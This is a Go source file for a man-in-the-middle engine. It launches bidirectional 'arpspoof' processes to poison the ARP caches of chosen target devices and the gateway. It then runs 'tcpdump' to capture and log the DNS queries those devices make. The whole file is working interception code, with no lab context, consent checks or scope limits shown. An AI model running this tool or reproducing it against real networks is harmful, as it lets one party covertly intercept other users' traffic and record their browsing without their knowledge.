package mitm

import (
	"bufio"
	"fmt"
	"log"
	"os/exec"
	"strings"
	"sync"
	"time"
)

type DNSEntry struct { Time string `json:"time"`; Domain string `json:"domain"`; Type string `json:"type"`; Status string `json:"status"` }
type tgt struct { MAC, IP string; c1, c2 *exec.Cmd; on bool }
type Engine struct { mu sync.RWMutex; tgts map[string]*tgt; gw, iface string; dnsLog []DNSEntry; dc *exec.Cmd }

func New() *Engine {
	gw, iface := "192.168.1.1", "eth0"
	out, _ := exec.Command("ip", "route", "show", "default").Output()
	f := strings.Fields(string(out)); if len(f) >= 5 { gw, iface = f[2], f[4] }
	return &Engine{tgts: make(map[string]*tgt), gw: gw, iface: iface}
}
func (e *Engine) GetDNSLog() []DNSEntry { e.mu.RLock(); defer e.mu.RUnlock(); o := make([]DNSEntry, len(e.dnsLog)); copy(o, e.dnsLog); return o }
func (e *Engine) GetActiveTargets() []string { e.mu.RLock(); defer e.mu.RUnlock(); var o []string; for m, t := range e.tgts { if t.on { o = append(o, m) } }; return o }
func (e *Engine) StartTarget(mac, ip string) error {
	e.mu.Lock(); defer e.mu.Unlock()
	if t, ok := e.tgts[mac]; ok && t.on { return fmt.Errorf("active") }
	log.Printf("[*] MITM %s", mac)
	c1 := exec.Command("arpspoof", "-i", e.iface, "-t", ip, e.gw); c1.Start()
	c2 := exec.Command("arpspoof", "-i", e.iface, "-t", e.gw, ip); c2.Start()
	e.tgts[mac] = &tgt{mac, ip, c1, c2, true}; if e.dc == nil { go e.sniff() }; return nil
}
func (e *Engine) StopTarget(mac string) error {
	e.mu.Lock(); defer e.mu.Unlock()
	t, ok := e.tgts[mac]; if !ok || !t.on { return fmt.Errorf("not active") }
	if t.c1 != nil { t.c1.Process.Kill() }; if t.c2 != nil { t.c2.Process.Kill() }; t.on = false; return nil
}
func (e *Engine) StopAll() {
	e.mu.Lock(); defer e.mu.Unlock()
	for _, t := range e.tgts { if t.on { if t.c1 != nil { t.c1.Process.Kill() }; if t.c2 != nil { t.c2.Process.Kill() }; t.on = false } }
	if e.dc != nil { e.dc.Process.Kill(); e.dc = nil }
}
func (e *Engine) sniff() {
	e.mu.Lock(); e.dc = exec.Command("tcpdump", "-i", e.iface, "-l", "-n", "port", "53")
	so, _ := e.dc.StdoutPipe(); e.dc.Start(); e.mu.Unlock()
	sc := bufio.NewScanner(so)
	for sc.Scan() {
		l := sc.Text(); if !strings.Contains(l, "A?") { continue }
		i := strings.Index(l, "A? "); if i < 0 { continue }
		d := strings.TrimSuffix(strings.Fields(l[i+3:])[0], ".")
		e.mu.Lock(); e.dnsLog = append(e.dnsLog, DNSEntry{time.Now().Format("15:04:05"), d, "A", "pass"})
		if len(e.dnsLog) > 5000 { e.dnsLog = e.dnsLog[len(e.dnsLog)-5000:] }; e.mu.Unlock()
	}
}
